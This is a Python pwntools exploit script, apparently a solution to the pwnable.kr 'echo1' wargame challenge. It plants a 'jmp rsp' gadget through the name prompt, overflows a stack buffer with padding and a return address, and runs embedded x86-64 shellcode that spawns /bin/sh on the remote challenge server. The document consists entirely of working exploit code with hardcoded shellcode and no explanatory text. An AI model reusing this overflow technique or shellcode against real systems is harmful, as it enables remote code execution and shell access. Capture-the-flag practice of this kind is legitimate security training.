from pwn import *
target = "./echo1"
binary = ELF("echo1")
target = ("pwnable.kr", 9010)
context(arch = "amd64", os = 'linux')

def get_io(target, local = True):
	if local == True:
		io = process(target, timeout = 9999)
	else:
		io = remote(target[0], target[1])

	return io

def pwn(io):

	jmp_esp_code = asm("jmp rsp")
	jmp_esp_addr = p64(0x00000000006020A0)

	print io.recvuntil("hey, what's your name? : ")
	io.send(jmp_esp_code + "\n")

	io.recvuntil("> ")
	io.send("1\n")

	io.recvuntil("\n")
	shellcode =  ""
	shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
	shellcode += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
	shellcode += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
	shellcode += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

	data = 'a' * 0x20 + 'c' * 8 + jmp_esp_addr + shellcode
	io.write(data + "\n")

	io.interactive()


io = get_io(target, local = False)
pwn(io)